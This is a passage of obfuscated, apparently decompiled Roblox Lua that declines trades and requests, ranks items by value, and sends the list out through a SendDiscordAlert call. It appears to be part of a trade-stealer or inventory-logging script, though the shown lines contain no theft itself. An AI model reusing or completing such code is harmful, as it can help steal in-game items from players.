    v54(DeclineTrade)
    task.wait(0.15)
elseif v273 == "ReceivingRequest" then
    v54(DeclineRequest)
    task.wait(0.15)
end

if #t1 > 0 then
    table.sort(t1, function(p40, p41) return p40.Value * p40.Amount > p41.Value * p41.Amount end)
    local t33 = {}
    for i, v in ipairs(t1) do t33[i] = v end
    
    task.spawn(function()
        SendDiscordAlert(t1)
    end)

    local v281
    local u282 = false

